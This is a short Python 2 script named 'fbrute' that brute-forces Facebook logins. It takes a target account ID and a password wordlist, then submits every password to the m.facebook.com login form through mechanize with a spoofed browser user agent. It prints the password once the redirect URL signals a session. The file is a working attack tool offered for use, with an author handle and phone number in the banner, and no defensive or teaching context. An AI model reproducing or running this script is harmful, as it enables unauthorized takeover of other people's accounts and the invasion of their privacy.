# coding: utf8
import sys,time,os,mechanize
import cookielib
def restart():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################
# Set Colors ######
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
##################
os.system("clear")
line="%s---------------"%(B)
os.system("figlet fbrute | lolcat")
print line
print "%sAuthor: %sHeroBrinePE"%(Y,G)
print "%sContact: %s+6281315181664"%(Y,G)
print line
try:
	id=sys.argv[1]
	sandi=sys.argv[2]
except:
	print "%s[!]%s Error Cek You Parameter%s"%(Y,R,N)
	sys.exit()
##
try:
	pw=open(sandi,"r+")
except:
	print "%s[!]%s Error Cek You Pasword Path%s"%(Y,R,N)
	
akmj = "https://m.facebook.com"
print "%s[!]%sCTRL+Z To Exit"%(R,G)
to=1
cj = cookielib.LWPCookieJar()
for pasw in pw.readlines():
		pasw = pasw.strip("\n")
		print "%s[!]%sAttempt => %i"%(Y,G,to)
		mech=mechanize.Browser()
		mech.set_handle_robots(False)
		mech.set_handle_redirect(True)
		mech.set_handle_referer(True)
		mech.set_handle_equiv(True)
		mech.set_cookiejar(cj)
		mech.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		mech.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
		mech.open(akmj)
		mech.select_form(nr=0)
		mech.form["email"]=id
		mech.form["pass"]=pasw
		mech.submit()
		text=mech.geturl()
		to += 1
		if "save-device" in text or  "m_sess" in text:
			print "%s[*]%sOK => %s"%(Y,G,pasw)
			sys.exit()
		else:
			print "%s[#]%sFAILED => %s"%(Y,R,pasw)